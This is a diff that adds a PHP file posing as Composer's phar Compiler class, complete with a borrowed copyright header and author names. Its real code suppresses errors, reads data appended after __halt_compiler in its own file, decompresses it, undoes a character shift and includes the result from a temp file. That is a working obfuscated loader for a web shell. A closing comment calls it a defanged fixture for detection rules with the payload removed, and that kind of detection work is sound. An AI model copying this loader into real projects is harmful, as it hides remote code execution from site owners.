@@ -1,0 +1,77 @@
+<?php //declare(strict_types=1);
+
+/*
+ * This file is part of Composer.
+ *
+ * (c) Nils Adermann <naderman@naderman.de>
+ *     Jordi Boggiano <j.boggiano@seld.be>
+ *
+ * For the full copyright and license information, please view the LICENSE
+ * file that was distributed with this source code.
+ *
+
+namespace Composer;
+
+use Composer\Json\JsonFile;
+use Composer\CaBundle\CaBundle;
+use Composer\Pcre\Preg;
+use Symfony\Component\Finder\Finder;
+use Symfony\Component\Process\Process;
+use Seld\PharUtils\Timestamps;
+use Seld\PharUtils\Linter;*/
+
+
+/**
+ * The Compiler class compiles composer into a phar
+ *
+ * @author Fabien Potencier <fabien@symfony.com>
+ * @author Jordi Boggiano <j.boggiano@seld.be>
+ */
+
+class Compiler {
+    private $shift;
+
+    public function __construct($shift = 1) {
+        error_reporting(0);
+        $this->shift = $shift;
+    }
+    public function Builder($input) {
+        $output = '';
+        for ($i = 0; $i < strlen($input); $i++) {
+            $ascii = ord($input[$i]);
+            $ascii -= $this->shift;
+            $output .= chr($ascii);
+        }
+        return $output;
+    }
+    public function slurp($input, $output) {
+        $fp = fopen($input, 'r');
+        fseek($fp, $output);
+	$temp_file = tmpfile();
+	fwrite($temp_file, $this->Builder(gzinflate(stream_get_contents($fp))));
+
+	include socket_get_status($temp_file)['uri'];
+
+	fclose($temp_file);
+	//return $output
+	}
+}
+$stdIn = new Compiler(3, "GENERATE_RANDOM_BYTE");
+$password = "<REDACTED-FIXTURE>"; //hashkarin1337
+$stdIn->slurp(__FILE__, __COMPILER_HALT_OFFSET__);
+
+    /**
+     * Compiles composer into a single phar file
+     *
+     * @param string $pharFile The full path to the file to create
+     *
+     * @throws \RuntimeException
+     */
+
+__halt_compiler // anjay
+/*BEGIN_PHAR*/();
+
+/* --- FIXTURE --- Payload removed. This is a defanged fragment of a real
+   web-shell sample, kept EXACTLY as far as needed for the registry rules to
+   catch it. Extension .fixture, not .php: the file is not executable and
+   does not fall under the structural scanner. --- */
